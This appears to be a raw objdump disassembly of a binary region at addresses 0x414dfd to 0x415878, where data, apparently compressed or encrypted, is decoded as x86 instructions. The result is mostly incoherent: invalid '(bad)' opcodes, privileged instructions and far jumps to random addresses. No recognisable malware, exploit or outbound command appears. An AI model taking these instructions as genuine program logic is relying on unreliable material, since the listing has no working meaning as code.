  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0x42804d16
  414e04:	add    al,0xdc
  414e06:	add    BYTE PTR [eax],al
  414e08:	add    al,0x1
  414e0a:	add    BYTE PTR [eax],al
  414e0c:	mov    ch,0x8a
  414e0e:	int3   
  414e0f:	sub    cl,ch
  414e11:	jge    0x414e63
  414e13:	stos   BYTE PTR es:[edi],al
  414e14:	mov    al,0x3e
  414e16:	iret   
  414e17:	cld    
  414e18:	inc    eax
  414e19:	arpl   sp,di
  414e1b:	add    bh,BYTE PTR [ebp-0x4a]
  414e1e:	fisttp WORD PTR [esi+edx*2+0x632bf6f6]
  414e25:	sahf   
  414e26:	mov    ?,WORD PTR [eax]
  414e28:	add    eax,0xed18ebb2
  414e2d:	(bad)
  414e30:	outs   dx,BYTE PTR ds:[esi]
  414e31:	(bad)  
  414e32:	nop
  414e33:	adc    BYTE PTR [ebx+eax*2],dl
  414e36:	popa   
  414e37:	ds jecxz 0x414e1f
  414e3a:	in     al,dx
  414e3b:	inc    ebp
  414e3c:	and    cl,bl
  414e3e:	loope  0x414dc7
  414e40:	call   0x99f7:0xcb89afb3
  414e47:	mov    ebp,0xa6df5091
  414e4c:	pop    esp
  414e4d:	xlat   BYTE PTR ds:[ebx]
  414e4e:	pop    ss
  414e4f:	mov    esp,0x8ec536eb
  414e54:	add    eax,0x7223f318
  414e59:	div    DWORD PTR [edi+0xa]
  414e5c:	cmp    esp,eax
  414e5e:	mov    eax,ds:0x5bb50675
  414e63:	jnp    0x414e23
  414e65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e66:	fs js  0x414ea5
  414e69:	push   ebx
  414e6a:	pop    ss
  414e6b:	popa   
  414e6c:	ret    0xf2dd
  414e6f:	xchg   ecx,eax
  414e70:	push   ebx
  414e71:	retf   0x1acb
  414e74:	leave  
  414e75:	cwde   
  414e76:	cmp    eax,0x201c3191
  414e7b:	adc    eax,0x3eb757b2
  414e80:	mov    ds:0x6eb3aecf,eax
  414e85:	ins    BYTE PTR es:[edi],dx
  414e86:	sbb    BYTE PTR [edi+0x696b1ef2],dh
  414e8c:	and    al,0x23
  414e8e:	mov    BYTE PTR [ecx],al
  414e90:	call   0xcd39:0x5cbd2776
  414e97:	pop    eax
  414e98:	xor    DWORD PTR [edx+0x34b510ad],ebx
  414e9e:	or     al,BYTE PTR [esi+0x39c35599]
  414ea4:	and    al,BYTE PTR [esi+edx*8-0x6dfe6a3d]
  414eab:	jne    0x414eeb
  414ead:	sbb    DWORD PTR [edi],ebx
  414eaf:	test   eax,0x5555c0a3
  414eb4:	stos   DWORD PTR es:[edi],eax
  414eb5:	sub    BYTE PTR ss:[eax],0x62
  414eb9:	xor    eax,0x41cd6311
  414ebe:	pop    edi
  414ebf:	call   FWORD PTR [edx-0x6e]
  414ec2:	add    al,0xce
  414ec4:	pop    edi
  414ec5:	lods   eax,DWORD PTR ds:[esi]
  414ec6:	cmp    al,0xd2
  414ec8:	cmp    al,0x5d
  414eca:	test   bl,bh
  414ecc:	sbb    DWORD PTR [ebx],ecx
  414ece:	or     DWORD PTR [eax+edx*2],ecx
  414ed1:	hlt    
  414ed2:	sbb    ebp,ecx
  414ed4:	xor    BYTE PTR [edx+0x56df29c3],cl
  414eda:	ss scas eax,DWORD PTR es:[edi]
  414edc:	jno    0x414f30
  414ede:	push   eax
  414edf:	xor    al,0x17
  414ee1:	loop   0x414ef0
  414ee3:	mov    ebx,0xa2e822f6
  414ee8:	sub    DWORD PTR [edi],0x44
  414eeb:	inc    eax
  414eec:	or     ecx,eax
  414eee:	dec    edx
  414eef:	fsubr  DWORD PTR [ebx+0x4e]
  414ef2:	xor    eax,0x11dd0a3e
  414ef7:	pusha  
  414ef8:	and    eax,0x98df8c13
  414efd:	push   eax
  414efe:	fs mov bl,0xbc
  414f01:	xchg   esp,eax
  414f02:	mov    ch,0x89
  414f04:	xor    DWORD PTR [eax],0x51
  414f07:	inc    ebx
  414f08:	mov    esi,DWORD PTR [edi+edx*2+0x51]
  414f0c:	stos   DWORD PTR es:[edi],eax
  414f0d:	and    al,0x38
  414f0f:	xchg   BYTE PTR [eax],al
	...
  414f71:	add    BYTE PTR [eax],al
  414f73:	add    BYTE PTR [edi],dh
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd08:0xd036add3
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    al,0x1
  414f8a:	add    BYTE PTR [eax],al
  414f8c:	int    0xa
  414f8e:	ret    0xd16e
  414f91:	jge    0x414fa9
  414f93:	(bad)
  414f97:	mov    edi,DWORD PTR [ebp-0x4b198938]
  414f9d:	sbb    eax,0x4c9c0af1
  414fa2:	cmp    DWORD PTR [edi],esp
  414fa4:	mov    WORD PTR [ebx-0x36],cs
  414fa7:	idiv   BYTE PTR [edi]
  414fa9:	cdq    
  414faa:	fiadd  WORD PTR [ecx+0x3ead96e8]
  414fb0:	ret    
  414fb1:	add    eax,0x937ecc06
  414fb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fb7:	arpl   WORD PTR [ebx],bp
  414fb9:	pop    ds
  414fba:	fdivr  QWORD PTR [esi-0x61]
  414fbd:	hlt    
  414fbe:	mov    edi,ebp
  414fc0:	push   edx
  414fc1:	cli    
  414fc2:	add    al,BYTE PTR [edi+ebp*4]
  414fc5:	sbb    BYTE PTR [eax+0x762c82c7],bh
  414fcb:	cli    
  414fcc:	sbb    ebp,ebp
  414fce:	outs   dx,BYTE PTR ds:[esi]
  414fcf:	popf   
  414fd0:	jg     0x414f6d
  414fd2:	lea    esp,[edi]
  414fd4:	push   ds
  414fd5:	xchg   ecx,eax
  414fd6:	cmp    al,0xdb
  414fd8:	push   ecx
  414fd9:	and    BYTE PTR [eax-0x3d],dh
  414fdc:	mov    eax,0x53e5af6f
  414fe1:	retf   
  414fe2:	ins    DWORD PTR es:[edi],dx
  414fe3:	or     DWORD PTR [esp+edi*1+0x64],eax
  414fe7:	push   ebp
  414fe8:	rol    DWORD PTR [eax],0x4e
  414feb:	psrad  mm1,mm0
  414fee:	daa    
  414fef:	xchg   ebx,eax
  414ff0:	ja     0x414ffb
  414ff2:	fiadd  DWORD PTR [edx]
  414ff4:	pop    ebp
  414ff5:	leave  
  414ff6:	pop    ebx
  414ff7:	dec    edx
  414ff8:	cmp    eax,0xf733c66f
  414ffd:	fidivr WORD PTR [edi+0x44]
  415000:	cmp    ecx,ebx
  415002:	sub    ah,cl
  415004:	jecxz  0x41503a
  415006:	mov    al,ds:0x30cdb1bc
  41500b:	adc    dh,bl
  41500d:	jne    0x414fcc
  41500f:	inc    edi
  415010:	and    BYTE PTR [ecx-0x2b1ce9bb],al
  415016:	das    
  415017:	mov    edx,cr5
  41501a:	leave  
  41501b:	or     BYTE PTR ss:[edx-0x64],bh
  41501f:	inc    ebx
  415020:	test   eax,0x4d82e263
  415025:	lea    eax,[edx]
  415027:	sahf   
  415028:	retf   0xd627
  41502b:	out    0xf9,al
  41502d:	xor    al,0x26
  41502f:	call   0x5f500265
  415034:	arpl   WORD PTR ds:0xf2262fa5,di
  41503a:	add    BYTE PTR [esi],al
  41503c:	test   esp,edi
  41503e:	data16 std 
  415040:	push   cs
  415041:	push   ss
  415042:	add    dh,BYTE PTR [ebx+0x1c94bfb0]
  415048:	mov    ch,0xd6
  41504a:	out    dx,al
  41504b:	add    DWORD PTR [edi-0x3e64bbf1],0xd4422d9e
  415055:	dec    ebx
  415056:	ret    0xb855
  415059:	cmc    
  41505a:	ins    DWORD PTR es:[edi],dx
  41505b:	inc    eax
  41505c:	and    cl,BYTE PTR [esi]
  41505e:	mov    bh,0x37
  415060:	ffree  st(6)
  415062:	dec    ebp
  415063:	call   0xb103feff
  415068:	sahf   
  415069:	pop    esi
  41506a:	xchg   BYTE PTR [esi],dl
  41506c:	loopne 0x4150c0
  41506e:	adc    DWORD PTR [eax+0x4f],edi
  415071:	push   es
  415072:	in     eax,dx
  415073:	push   esp
  415074:	loope  0x415052
  415076:	mov    esp,0x6e8f8452
  41507b:	jmp    0x415021
  41507d:	ins    DWORD PTR es:[edi],dx
  41507e:	and    DWORD PTR [ebp+0x5c],esp
  415081:	pop    ds
  415082:	pop    ebx
  415083:	retf   
  415084:	push   ebp
  415085:	ficomp DWORD PTR [ebx]
  415087:	dec    ebx
  415088:	push   ds
  415089:	and    cl,BYTE PTR [eax+0x1e]
  41508c:	retf   
  41508d:	dec    eax
  41508e:	mov    BYTE PTR [edi],cl
	...
  4150f4:	jnp    0x4150f8
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0x5d99fc2d
  415102:	pop    ss
  415103:	xor    DWORD PTR [esi+ebx*8],ecx
  415106:	add    BYTE PTR [eax],al
  415108:	add    al,0x1
  41510a:	add    BYTE PTR [eax],al
  41510c:	lock (bad) 
  41510e:	mov    esi,0x5680869d
  415113:	jns    0x415113
  415115:	sbb    DWORD PTR [edx-0x5f],0x69
  415119:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41511b:	mov    ch,0x60
  41511d:	retf   
  41511e:	(bad)  
  41511f:	dec    edx
  415120:	push   ecx
  415121:	mov    al,ds:0x532ec0fd
  415126:	jmp    0x24358421
  41512b:	not    cl
  41512d:	xchg   ebx,eax
  41512e:	bound  edx,QWORD PTR [edx]
  415130:	arpl   WORD PTR [esi-0x53c4808a],bx
  415136:	lea    ebp,[ecx-0x41]
  415139:	mov    eax,ds:0xec8630c5
  41513e:	(bad)  
  41513f:	push   ecx
  415140:	(bad)  
  415142:	push   eax
  415143:	sub    BYTE PTR [ecx-0x1c],ch
  415146:	pushf  
  415147:	mov    ch,0xd8
  415149:	mov    ah,0xeb
  41514b:	xchg   esp,eax
  41514c:	jnp    0x415157
  41514e:	ds retf 
  415150:	mov    dl,0x1b
  415152:	mov    eax,ds:0xfbfe0d8d
  415158:	pop    ebx
  415159:	cmc    
  41515a:	aad    0x4d
  41515c:	mov    ds,ebp
  41515e:	pop    eax
  41515f:	das    
  415160:	sbb    al,0x33
  415162:	xchg   ebp,eax
  415163:	nop
  415164:	dec    ebp
  415165:	cmp    al,0xb2
  415167:	es fwait
  415169:	mov    bh,0x57
  41516b:	iret   
  41516c:	jmp    0x28008cdd
  415171:	xchg   ecx,eax
  415172:	pop    esi
  415173:	daa    
  415174:	ret    0x8060
  415177:	and    ch,ah
  415179:	jle    0x415113
  41517b:	imul   ebx,DWORD PTR [eax],0x56b9f990
  415181:	jae    0x415199
  415183:	(bad)  
  415185:	popf   
  415186:	pop    ss
  415187:	dec    ebx
  415188:	stc    
  415189:	js     0x4151ff
  41518b:	jmp    0xc8e7:0x35ddd075
  415192:	push   cs
  415193:	jno    0x4151e6
  415195:	add    ebx,DWORD PTR [ebx+0x65497195]
  41519b:	xchg   DWORD PTR [ecx+0x31],esi
  41519e:	ins    BYTE PTR es:[edi],dx
  41519f:	jmp    0x469a9768
  4151a4:	sbb    DWORD PTR [ebp-0xa],edi
  4151a7:	push   0x28
  4151a9:	js     0x415176
  4151ab:	jl     0x415131
  4151ad:	mov    ah,al
  4151af:	popf   
  4151b0:	aad    0xd0
  4151b2:	ja     0x415146
  4151b4:	and    cl,bl
  4151b6:	dec    ecx
  4151b7:	stc    
  4151b8:	jecxz  0x415219
  4151ba:	push   es
  4151bb:	pop    esi
  4151bc:	sbb    BYTE PTR ds:0x5c3563dc,ah
  4151c2:	retf   
  4151c3:	jge    0x41517f
  4151c5:	out    0x4b,eax
  4151c7:	loop   0x4151db
  4151c9:	je     0x4151c7
  4151cb:	sbb    al,0x22
  4151cd:	xchg   esp,eax
  4151ce:	push   esi
  4151cf:	fwait
  4151d0:	sbb    BYTE PTR [edx-0x4f6880f1],cl
  4151d6:	cmc    
  4151d7:	test   al,0xa6
  4151d9:	mov    bl,0x33
  4151db:	stos   DWORD PTR es:[edi],eax
  4151dc:	xchg   ebx,eax
  4151dd:	inc    edx
  4151de:	add    edi,DWORD PTR [esi+0x12c81d10]
  4151e4:	dec    esp
  4151e5:	add    esi,ecx
  4151e7:	ins    DWORD PTR es:[edi],dx
  4151e8:	fwait
  4151e9:	cdq    
  4151ea:	mov    bh,BYTE PTR [esi-0x5c]
  4151ed:	outs   dx,DWORD PTR ds:[esi]
  4151ee:	and    dl,BYTE PTR [esi-0x651e9ba4]
  4151f4:	xchg   esp,eax
  4151f5:	cwde   
  4151f6:	push   ebp
  4151f7:	pop    edi
  4151f8:	inc    esp
  4151f9:	sbb    BYTE PTR [eax],cl
  4151fb:	adc    BYTE PTR [eax-0x2e],dh
  4151fe:	not    esp
  415200:	hlt    
  415201:	adc    ah,BYTE PTR [ebx]
  415203:	mov    bl,0xa9
  415205:	push   0x357cc43d
  41520a:	in     al,0xc6
  41520c:	dec    eax
  41520d:	leave  
  41520e:	mov    ebx,0x98
	...
  415273:	add    BYTE PTR [edi+edx*4],ch
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0xbd2f710b
  415283:	aas    
  415284:	adc    bh,bl
  415286:	add    BYTE PTR [eax],al
  415288:	add    al,0x1
  41528a:	add    BYTE PTR [eax],al
  41528c:	dec    ebp
  41528d:	xor    eax,0x2e4f8718
  415292:	xor    edx,ecx
  415294:	add    BYTE PTR [ecx+ebx*8-0x6be4552f],dl
  41529b:	loop   0x4152ab
  41529d:	ins    BYTE PTR es:[edi],dx
  41529e:	sbb    ebp,esp
  4152a0:	mov    ecx,0x1abd76c5
  4152a5:	or     esi,edx
  4152a7:	xchg   ch,ah
  4152a9:	ret    0xd66
  4152ac:	or     ah,cl
  4152ae:	jmp    0xb72c:0x6dae6f9e
  4152b5:	imul   edx,DWORD PTR [eax+0x14],0x51
  4152b9:	gs sub al,0x3d
  4152bc:	jnp    0x415254
  4152be:	mov    bl,0x66
  4152c0:	and    ah,BYTE PTR [esi-0x5e]
  4152c3:	xchg   edx,eax
  4152c4:	ds xchg esp,eax
  4152c6:	push   cs
  4152c7:	imul   BYTE PTR [edi-0x6c]
  4152ca:	and    eax,0x17f76bd1
  4152cf:	inc    edi
  4152d0:	(bad)  
  4152d2:	out    dx,eax
  4152d3:	(bad)  
  4152d4:	stos   DWORD PTR es:[edi],eax
  4152d5:	pop    eax
  4152d6:	aaa    
  4152d7:	lahf   
  4152d8:	dec    ecx
  4152d9:	call   0x5f9e54eb
  4152de:	jmp    0x4152e7
  4152e0:	test   DWORD PTR [eax-0x148e0468],ecx
  4152e6:	mov    ebp,0xdf3d896d
  4152eb:	ffree  st(7)
  4152ed:	push   0xd91c2a61
  4152f2:	inc    eax
  4152f3:	pop    edx
  4152f4:	mov    dh,0xc3
  4152f6:	xlat   BYTE PTR ds:[ebx]
  4152f7:	and    DWORD PTR [edi],0xc81b922d
  4152fd:	pop    ebx
  4152fe:	imul   edx,DWORD PTR [ecx+eiz*4-0x4c],0x5d
  415303:	pop    ecx
  415304:	jo     0x41535c
  415306:	sub    al,0x2
  415308:	bound  eax,QWORD PTR [ecx-0x2d161288]
  41530e:	pop    ss
  41530f:	rol    DWORD PTR [ebp+0x17ade13b],1
  415315:	mov    al,ss:0xf9a1beb0
  41531b:	aam    0xa0
  41531d:	(bad)  
  41531f:	push   cs
  415320:	int3   
  415321:	mov    edx,ebp
  415323:	and    eax,0xdaa29085
  415328:	and    BYTE PTR [edx],ah
  41532a:	scas   al,BYTE PTR es:[edi]
  41532b:	push   ebx
  41532c:	mov    ?,WORD PTR [eax+0x11356471]
  415332:	jns    0x415352
  415334:	pop    edx
  415335:	jge    0x41534d
  415337:	pop    ebx
  415338:	adc    DWORD PTR [eax],ebx
  41533a:	cdq    
  41533b:	pop    ecx
  41533c:	mov    WORD PTR [ebx],ss
  41533e:	out    dx,al
  41533f:	pop    ebp
  415340:	mov    DWORD PTR [edx],ecx
  415342:	aaa    
  415343:	lea    esp,ds:0xa6ad780b
  415349:	mov    esi,0x8c5a1751
  41534e:	push   ss
  41534f:	cmp    eax,0x55f9ad49
  415354:	test   DWORD PTR [ecx+0x6c296a5e],edi
  41535a:	jl     0x415383
  41535c:	add    DWORD PTR [ecx],edx
  41535e:	adc    BYTE PTR [edi-0x1ec04316],bh
  415364:	inc    ebx
  415365:	cmp    eax,0xf1419f6d
  41536a:	xchg   edx,eax
  41536b:	into   
  41536c:	jp     0x415319
  41536e:	aaa    
  41536f:	mov    edx,DWORD PTR [eax+edx*4]
  415372:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415373:	es hlt 
  415375:	xor    dl,ch
  415377:	arpl   WORD PTR [edx],si
  415379:	jl     0x4153b4
  41537b:	cmp    esi,DWORD PTR [eax]
  41537d:	loope  0x41533a
  41537f:	adc    ah,BYTE PTR [ebx]
  415381:	dec    esi
  415382:	dec    DWORD PTR ss:[si]
  415386:	pop    eax
  415387:	and    bh,BYTE PTR [eax]
  415389:	test   al,0x88
  41538b:	mov    dl,0xc7
  41538d:	sbb    eax,0xffbd
	...
  4153f2:	add    BYTE PTR [eax],al
  4153f4:	ins    DWORD PTR es:[edi],dx
  4153f5:	lock repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0xf1d3e5b0
  415401:	xchg   DWORD PTR [edx-0x61],edi
  415404:	adc    al,0xe0
  415406:	add    BYTE PTR [eax],al
  415408:	add    al,0x1
  41540a:	add    BYTE PTR [eax],al
  41540c:	xchg   DWORD PTR [edi-0x7c],ecx
  41540f:	rol    esi,1
  415411:	mov    esi,0x9bc9a3c4
  415416:	imul   eax,DWORD PTR [eax+edx*2-0x6b],0x53
  41541b:	out    dx,eax
  41541c:	pusha  
  41541d:	inc    eax
  41541f:	mov    dh,0x51
  415421:	xor    ebp,esi
  415423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415424:	addr16 clc 
  415426:	mov    esi,0xd00d8b0d
  41542b:	or     dl,bh
  41542d:	xor    esi,DWORD PTR [ecx+0x77]
  415430:	scas   al,BYTE PTR es:[edi]
  415431:	sub    edi,DWORD PTR [eax-0x21d92816]
  415437:	mov    dl,0xe0
  415439:	inc    ebx
  41543a:	mov    WORD PTR [edi+0x76],gs
  41543d:	inc    edi
  41543e:	adc    eax,ebx
  415440:	sub    DWORD PTR [edi],ecx
  415442:	or     edx,DWORD PTR [esi+0x8]
  415445:	dec    esp
  415446:	add    ch,ah
  415448:	arpl   WORD PTR [ebp+0x943d3c8],sp
  41544e:	hlt    
  41544f:	or     ebp,DWORD PTR [ebp-0x3018a684]
  415455:	test   eax,0xcde6fc4c
  41545a:	push   es
  41545b:	mov    ds:0xa1a8af20,eax
  415460:	test   al,0x73
  415462:	sub    DWORD PTR [ecx-0x7d62e379],0x8eabe6bc
  41546c:	push   ebx
  41546d:	inc    ebx
  41546e:	add    edi,DWORD PTR [edi]
  415470:	test   eax,0x27da9a3f
  415475:	inc    edi
  415476:	call   0x8727cdab
  41547b:	cmc    
  41547c:	fsub   DWORD PTR [eax+0x36]
  41547f:	mov    ebx,0xc085ba33
  415484:	dec    eax
  415485:	push   ss
  415486:	in     eax,dx
  415487:	cmp    ch,BYTE PTR [eax-0x5f]
  41548a:	jae    0x415451
  41548c:	icebp  
  41548d:	or     BYTE PTR [edx],dh
  41548f:	xor    ah,dh
  415491:	int3   
  415492:	mov    ds:0x2a78e693,al
  415497:	push   cs
  415498:	ret    
  415499:	inc    eax
  41549a:	sub    al,0x6c
  41549c:	sub    BYTE PTR [eax],cl
  41549e:	fwait
  41549f:	lea    ebp,[esi+0x36ec305a]
  4154a5:	out    0xe,al
  4154a7:	shl    BYTE PTR [edi+0x48],cl
  4154aa:	int    0xdb
  4154ac:	sbb    cl,dh
  4154ae:	pop    esi
  4154af:	pushf  
  4154b0:	dec    edi
  4154b1:	ds (bad) 
  4154b3:	jns    0x4154aa
  4154b5:	lds    ebx,FWORD PTR [edx-0x64]
  4154b8:	stc    
  4154b9:	in     al,dx
  4154ba:	xchg   BYTE PTR [edi],cl
  4154bc:	add    BYTE PTR [eax+0x70],0x2c
  4154c0:	in     eax,0x8
  4154c2:	dec    edi
  4154c3:	jmp    0xda38:0xb5df9e91
  4154ca:	jle    0x415454
  4154cc:	adc    dl,BYTE PTR [esi]
  4154ce:	sub    eax,0xbddfe5ca
  4154d3:	(bad)  
  4154d4:	(bad)  
  4154d5:	xchg   esi,eax
  4154d6:	pop    ds
  4154d7:	sub    al,0x8b
  4154d9:	sbb    ecx,DWORD PTR [ebp-0x79fdf981]
  4154df:	fcomp  DWORD PTR [edx-0x8]
  4154e2:	call   0x507ba1c2
  4154e7:	xchg   esi,eax
  4154e8:	push   0x60
  4154ea:	dec    eax
  4154eb:	pop    eax
  4154ec:	shr    DWORD PTR [edx],0x5e
  4154ef:	retf   
  4154f0:	lods   eax,DWORD PTR ds:[esi]
  4154f1:	loopne 0x415549
  4154f3:	xchg   ebx,eax
  4154f4:	dec    ebp
  4154f5:	loop   0x4154a9
  4154f7:	dec    esi
  4154f8:	fs aaa 
  4154fa:	js     0x415567
  4154fc:	aam    0x4d
  4154fe:	mov    esi,0xd89a5da7
  415503:	dec    eax
  415504:	xchg   edx,eax
  415505:	mov    edi,0x4ca22b35
  41550a:	pop    es
  41550b:	(bad)  
  41550c:	dec    DWORD PTR [eax+0x229f]
	...
  415572:	add    BYTE PTR [eax],al
  415574:	in     al,0xf0
  415576:	sub    DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x4155c3
  415581:	enter  0x3219,0x18
  415585:	loope  0x415587
  415587:	add    BYTE PTR [ecx+eax*1],al
  41558a:	add    BYTE PTR [eax],al
  41558c:	cli    
  41558d:	inc    edx
  41558e:	xor    eax,0x78e2609e
  415593:	jo     0x4155d9
  415595:	sti    
  415596:	jg     0x41553c
  415598:	pop    es
  415599:	nop
  41559a:	jmp    0x8ba4:0x4fb29745
  4155a1:	cli    
  4155a2:	fdiv   QWORD PTR [ecx]
  4155a4:	add    BYTE PTR [edi-0x34],al
  4155a7:	call   0xe07:0x8fdbe1ef
  4155ae:	inc    ebp
  4155af:	pop    ecx
  4155b0:	int    0x5e
  4155b2:	leave  
  4155b3:	mov    cl,0x66
  4155b5:	xchg   ebx,eax
  4155b6:	clts   
  4155b8:	mov    dl,0xa1
  4155ba:	mov    bl,0x4a
  4155bc:	stos   DWORD PTR es:[edi],eax
  4155bd:	sub    eax,0x1d7f620d
  4155c2:	(bad)  
  4155c3:	jb     0x41563d
  4155c5:	push   ss
  4155c6:	adc    ebx,DWORD PTR [edi]
  4155c8:	sub    ecx,DWORD PTR gs:[edx]
  4155cb:	adc    dh,bh
  4155cd:	cmp    eax,0x9bb3c8f8
  4155d2:	das    
  4155d3:	icebp  
  4155d4:	jbe    0x4155b3
  4155d6:	imul   ebx,DWORD PTR [edi],0xb9ca94b6
  4155dc:	jmp    0xc26dbdbe
  4155e1:	test   bh,dl
  4155e3:	in     al,0x8d
  4155e5:	lods   al,BYTE PTR ds:[esi]
  4155e6:	(bad)  
  4155e7:	aad    0x42
  4155e9:	pop    ds
  4155ea:	mov    esi,0xa392e434
  4155ef:	cmp    ah,al
  4155f1:	and    eax,0xec779195
  4155f6:	cli    
  4155f7:	fldenv [eax+ebp*4+0x47]
  4155fb:	mov    al,0xd5
  4155fd:	xchg   ebp,eax
  4155fe:	jne    0x415668
  415600:	xor    ah,BYTE PTR [esi]
  415602:	out    dx,eax
  415603:	xchg   BYTE PTR [esi],dh
  415605:	ret    0xf573
  415608:	out    dx,al
  415609:	clc    
  41560a:	shl    DWORD PTR [edi+0x2b2b7e48],1
  415610:	and    ch,al
  415612:	pop    ss
  415613:	imul   esp,esp,0xf988df71
  415619:	cli    
  41561a:	pop    edx
  41561b:	lods   al,BYTE PTR ds:[esi]
  41561c:	dec    esi
  41561d:	es daa 
  41561f:	cmc    
  415620:	or     eax,0x74be6a71
  415625:	cs or  al,0x38
  415628:	cmp    al,0x6e
  41562a:	out    0x9d,eax
  41562c:	aad    0x24
  41562e:	rcl    DWORD PTR ss:[eax-0x5],cl
  415632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415633:	sahf   
  415634:	and    eax,0x88d7cf8a
  415639:	xchg   esp,eax
  41563a:	lock sahf 
  41563c:	aam    0xdf
  41563e:	inc    ebx
  41563f:	popa   
  415640:	jle    0x415651
  415642:	add    DWORD PTR [eax],0xffffff84
  415645:	xor    eax,0x3b031d05
  41564a:	adc    eax,0x369d51e5
  41564f:	sub    al,0x1e
  415651:	fisub  WORD PTR [ebx+edx*4]
  415654:	aas    
  415655:	je     0x415603
  415657:	icebp  
  415658:	sub    dh,al
  41565a:	fimul  DWORD PTR ds:0xc08282a4
  415660:	lds    edi,FWORD PTR [esi]
  415662:	mov    esp,0x7cbb6c07
  415667:	and    DWORD PTR [ebp+0x40],edx
  41566a:	sbb    dh,BYTE PTR [ecx-0x14]
  41566d:	or     esi,edi
  41566f:	out    dx,al
  415670:	out    dx,al
  415671:	and    al,BYTE PTR [ebx]
  415673:	mov    DWORD PTR [ecx+0x6d9bd66c],edx
  415679:	scas   eax,DWORD PTR es:[edi]
  41567a:	ret    0x81d8
  41567d:	mov    DWORD PTR [eax-0x46],edi
  415680:	push   0x6b
  415682:	(bad)  
  415683:	xchg   ebp,eax
  415684:	mov    ebx,0x6232f9b8
  415689:	cmp    dh,BYTE PTR [ebx+0x573086e8]
  41568f:	enter  0x0,0x0
	...
  4156f3:	add    BYTE PTR [ebp-0x66],ch
  4156f6:	mov    esp,0xfd67ff45
  4156fb:	mov    edx,0x2c46bab3
  415700:	xchg   ebx,eax
  415701:	adc    DWORD PTR [edx],0xffffffc2
  415704:	sbb    al,0xe2
  415706:	add    BYTE PTR [eax],al
  415708:	add    al,0x1
  41570a:	add    BYTE PTR [eax],al
  41570c:	js     0x415693
  41570e:	sub    ecx,0x46
  415711:	mov    bh,0x18
  415713:	pushf  
  415714:	sbb    bl,BYTE PTR [edi]
  415716:	inc    edi
  415717:	call   0x8e0b:0x16216380
  41571e:	dec    edx
  41571f:	pop    es
  415720:	aad    0xc0
  415722:	and    eax,0x1affcf88
  415727:	or     al,dh
  415729:	push   ss
  41572a:	dec    ebx
  41572b:	push   edi
  41572c:	scas   eax,DWORD PTR es:[edi]
  41572d:	mov    eax,0x25511e92
  415732:	fmulp  st(3),st
  415734:	mov    edx,0x450ef178
  415739:	mov    ebp,0x26cc5cbf
  41573e:	mov    ch,0x5a
  415740:	push   0x3615e8f5
  415745:	mov    dh,BYTE PTR cs:[ebx+0x5d]
  415749:	fistp  QWORD PTR [edi]
  41574b:	cmp    eax,DWORD PTR [ebp+0x8896212]
  415751:	pop    ebx
  415752:	sbb    BYTE PTR [ebx-0x31456e60],cl
  415758:	inc    eax
  415759:	or     dh,cl
  41575b:	xor    BYTE PTR [ebp-0x6c],ch
  41575e:	lea    esp,[ebp+0x3967a0d0]
  415764:	je     0x4157dc
  415766:	js     0x41570f
  415768:	pop    es
  415769:	div    BYTE PTR [esi-0x71955a8f]
  41576f:	cmp    eax,0x7d7b67ac
  415774:	adc    DWORD PTR [edi],0xffffffbf
  415777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415778:	loope  0x4157ae
  41577a:	jmp    0x1d56:0x6ace5909
  415781:	jb     0x4157b0
  415783:	sbb    ah,BYTE PTR [bx]
  415786:	stos   BYTE PTR es:[edi],al
  415787:	ins    DWORD PTR es:[edi],dx
  415788:	loop   0x415718
  41578a:	inc    esi
  41578b:	cmp    esi,DWORD PTR [edi-0x2c]
  41578e:	xchg   edi,eax
  41578f:	inc    ebx
  415790:	or     BYTE PTR [ecx+0x27],dh
  415793:	and    eax,0xe350ba1
  415798:	xor    eax,0xc8ae7b1b
  41579d:	cwde   
  41579e:	push   0xc0758085
  4157a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157a4:	retf   
  4157a5:	arpl   WORD PTR [esi-0x4b],si
  4157a8:	pop    es
  4157a9:	cmp    BYTE PTR [edx],0x1f
  4157ac:	or     cl,dl
  4157ae:	in     eax,0x8c
  4157b0:	fsubr  st(3),st
  4157b2:	pop    eax
  4157b3:	int    0xd1
  4157b5:	dec    DWORD PTR [edi+0x76]
  4157b8:	fstp   DWORD PTR [edi]
  4157ba:	cmp    DWORD PTR [ecx-0x182f6f42],eax
  4157c0:	fld    QWORD PTR [ebx]
  4157c2:	shl    DWORD PTR [eax-0x38],1
  4157c5:	sub    eax,0x1fcb7247
  4157ca:	fisttp WORD PTR [eax]
  4157cc:	cmp    al,0xd5
  4157cf:	sub    BYTE PTR [eax+esi*8-0x2e8d50b7],ah
  4157d6:	add    eax,0x73115c9e
  4157db:	test   edx,ecx
  4157dd:	or     ch,BYTE PTR [ebx+0x2]
  4157e0:	adc    al,0xb1
  4157e2:	or     dh,dh
  4157e4:	mov    ds:0xd81cd308,eax
  4157e9:	int    0xe6
  4157eb:	mov    ss,WORD PTR [eax+edi*8+0x2c]
  4157ef:	jge    0x415785
  4157f1:	jmp    0x9614:0xe5ab64e2
  4157f8:	sti    
  4157f9:	mov    ds:0xc4f85512,al
  4157fe:	jecxz  0x415801
  415800:	ja     0x415867
  415802:	xchg   esi,eax
  415803:	and    ah,cl
  415805:	and    al,0xd3
  415807:	fwait
  415808:	mov    edx,0xe31d414d
  41580d:	repz adc al,0xf1
	...
  415874:	retf   
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
